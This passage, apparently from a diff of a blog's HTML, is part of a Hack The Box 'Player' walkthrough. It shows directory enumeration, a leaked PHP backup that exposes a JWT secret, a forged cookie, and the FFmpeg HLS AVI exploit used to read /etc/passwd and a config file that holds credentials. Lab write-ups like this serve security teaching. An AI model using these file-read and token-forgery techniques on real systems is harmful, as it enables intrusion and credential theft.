+&lt;p&gt;&lt;br /&gt;The error exposed some filenames like &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/backup/service_config&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/staging/fix.php&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/staging/contact.php&lt;/code&gt;. That will be helpful later.
+&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;chat&lt;/code&gt; was a static page that simulated a chat application:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/8.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt; I took a quick look at the chat history between Olla and Vincent, Olla asked him about some pentest reports and he replied with 2 interesting things :&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/9.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/10.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Staging exposing sensitive files.&lt;/li&gt;
+  &lt;li&gt;Main domain exposing source code allowing to access the product before release.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;br /&gt;We already saw that &lt;code class=&quot;highlighter-rouge&quot;&gt;staging&lt;/code&gt; was exposing files, I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; on the main domain and found &lt;code class=&quot;highlighter-rouge&quot;&gt;/launcher&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/player# gobuster dir -u http://player.htb/ -w /usr/share/wordlists/dirb/common.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://player.htb/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/01/17 19:17:29 Starting gobuster
+===============================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/launcher (Status: 301)
+/server-status (Status: 403)
+===============================================================
+2020/01/17 19:18:59 Finished
+===============================================================
+root@kali:~/Desktop/HTB/boxes/player# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://player.htb/launcher&lt;/code&gt;:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/11.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;I tried to submit that form but it did nothing, I just got redirected to &lt;code class=&quot;highlighter-rouge&quot;&gt;/launcher&lt;/code&gt; again:
+&lt;br /&gt;Request:&lt;/p&gt;
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;GET&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/launcher/dee8dc8a47256c64630d803a4c40786c.php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;player.htb&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Language&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;en-US,en;q=0.5&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gzip, deflate&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Referer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;http://player.htb/launcher/index.html&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;access=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IkMwQjEzN0ZFMkQ3OTI0NTlGMjZGRjc2M0NDRTQ0NTc0QTVCNUFCMDMifQ.cjGwng6JiMiOWZGz7saOdOuhyr1vad5hAxOJCiM3uzU&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;Response:&lt;/p&gt;
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;302&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;Found&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Fri, 17 Jan 2020 22:45:04 GMT&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Apache/2.4.7 (Ubuntu)&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Powered-By&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;PHP/5.5.9-1ubuntu4.26&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;index.html&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;0&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;We know from the chat that the source code is exposed somewhere, I wanted to read the source of &lt;code class=&quot;highlighter-rouge&quot;&gt;/launcher/dee8dc8a47256c64630d803a4c40786c.php&lt;/code&gt; so I tried some basic stuff like adding &lt;code class=&quot;highlighter-rouge&quot;&gt;.swp&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;.bak&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;~&lt;/code&gt; after the file name. &lt;code class=&quot;highlighter-rouge&quot;&gt;~&lt;/code&gt; worked (check &lt;a href=&quot;https://superuser.com/questions/546146/what-does-a-mean-after-a-file-name-in-unix-bash&quot;&gt;this&lt;/a&gt; out):&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/player# curl http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php~
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'vendor/autoload.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;\Firebase\JWT\JWT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;access&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'_S0_R@nd0m_P@ss_'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$decoded&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;JWT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;access&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;base64_decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'-_'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'+/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'HS256'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$decoded&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;access_code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0E76658526655756207688271159624026011393&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Location: 7F2xxxxxxxxxxxxx/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Location: index.html&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$token_payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
+          &lt;span class=&quot;s1&quot;&gt;'project'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'PlayBuff'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+          &lt;span class=&quot;s1&quot;&gt;'access_code'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'C0B137FE2D792459F26FF763CCE44574A5B5AB03'&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'_S0_R@nd0m_P@ss_'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$jwt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;JWT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$token_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;base64_decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'-_'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'+/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'HS256'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$cookiename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'access'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;setcookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'access'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$jwt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;86400&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Location: index.html&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+root@kali:~/Desktop/HTB/boxes/player#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;It decodes the &lt;code class=&quot;highlighter-rouge&quot;&gt;JWT&lt;/code&gt; token from the cookie &lt;code class=&quot;highlighter-rouge&quot;&gt;access&lt;/code&gt; and redirects us to a redacted path if the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;access_code&lt;/code&gt; was &lt;code class=&quot;highlighter-rouge&quot;&gt;0E76658526655756207688271159624026011393&lt;/code&gt;, otherwise it will assign an &lt;code class=&quot;highlighter-rouge&quot;&gt;access&lt;/code&gt; cookie for us with &lt;code class=&quot;highlighter-rouge&quot;&gt;C0B137FE2D792459F26FF763CCE44574A5B5AB03&lt;/code&gt; as the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;access_code&lt;/code&gt; and redirect us to &lt;code class=&quot;highlighter-rouge&quot;&gt;index.html&lt;/code&gt;. 
+&lt;br /&gt;We have the secret &lt;code class=&quot;highlighter-rouge&quot;&gt;_S0_R@nd0m_P@ss_&lt;/code&gt; so we can easily craft a valid cookie. I used &lt;a href=&quot;https://jwt.io/&quot;&gt;jwt.io&lt;/a&gt; to edit my token. &lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/12.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/13.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;I used the cookie and got redirected to &lt;code class=&quot;highlighter-rouge&quot;&gt;/7F2dcsSdZo6nj3SNMTQ1&lt;/code&gt;:
+&lt;br /&gt;Request:&lt;/p&gt;
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;GET&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/launcher/dee8dc8a47256c64630d803a4c40786c.php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;player.htb&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Language&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;en-US,en;q=0.5&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gzip, deflate&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Referer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;http://player.htb/launcher/index.html&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;access=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IjBFNzY2NTg1MjY2NTU3NTYyMDc2ODgyNzExNTk2MjQwMjYwMTEzOTMifQ.VXuTKqw__J4YgcgtOdNDgsLgrFjhN1_WwspYNf_FjyE&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;Response:&lt;/p&gt;
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;302&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;Found&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Fri, 17 Jan 2020 22:50:59 GMT&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Apache/2.4.7 (Ubuntu)&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Powered-By&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;PHP/5.5.9-1ubuntu4.26&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;7F2dcsSdZo6nj3SNMTQ1/&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;0&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/14.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;ffmpeg-hls-vulnerability--arbitrary-file-read&quot;&gt;FFmpeg HLS Vulnerability –&amp;gt; Arbitrary File Read&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;I uploaded a test &lt;code class=&quot;highlighter-rouge&quot;&gt;txt&lt;/code&gt; file:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/15.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/16.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;I got an &lt;code class=&quot;highlighter-rouge&quot;&gt;avi&lt;/code&gt; file as a result which was weird:&lt;/p&gt;
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http:\/\/player.htb/launcher/7F2dcsSdZo6nj3SNMTQ1/uploads/518515582.avi&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;I tried some other file formats and I also got an &lt;code class=&quot;highlighter-rouge&quot;&gt;avi&lt;/code&gt; file.
+&lt;br /&gt;So I tried the &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ffmpeg HLS&lt;/code&gt; exploit&lt;/a&gt;, I created a test &lt;code class=&quot;highlighter-rouge&quot;&gt;avi&lt;/code&gt; to read &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; and it worked:&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/player/avi# ./gen_xbin_avi.py file:///etc/passwd test.avi
+root@kali:~/Desktop/HTB/boxes/player/avi# file test.avi 
+test.avi: RIFF (little-endian) data, AVI, 224 x 160, 25.00 fps,
+root@kali:~/Desktop/HTB/boxes/player/avi#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/17.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;I created 3 more &lt;code class=&quot;highlighter-rouge&quot;&gt;avi&lt;/code&gt;s to read the files we got earlier from the error message from &lt;code class=&quot;highlighter-rouge&quot;&gt;staging&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/player/avi# ./gen_xbin_avi.py file:///var/www/staging/contact.php contact.avi
+root@kali:~/Desktop/HTB/boxes/player/avi# ./gen_xbin_avi.py file:///var/www/backup/service_config service_config.avi
+root@kali:~/Desktop/HTB/boxes/player/avi# ./gen_xbin_avi.py file:///var/www/staging/fix.php fix.avi
+root@kali:~/Desktop/HTB/boxes/player/avi#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;contact.php&lt;/code&gt; didn’t have anything interesting and the &lt;code class=&quot;highlighter-rouge&quot;&gt;avi&lt;/code&gt; for &lt;code class=&quot;highlighter-rouge&quot;&gt;fix.php&lt;/code&gt; was empty for some reason. In &lt;code class=&quot;highlighter-rouge&quot;&gt;service_config&lt;/code&gt; there were some credentials for a user called &lt;code class=&quot;highlighter-rouge&quot;&gt;telegen&lt;/code&gt;:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/18.png&quot; alt=&quot;&quot; /&gt;
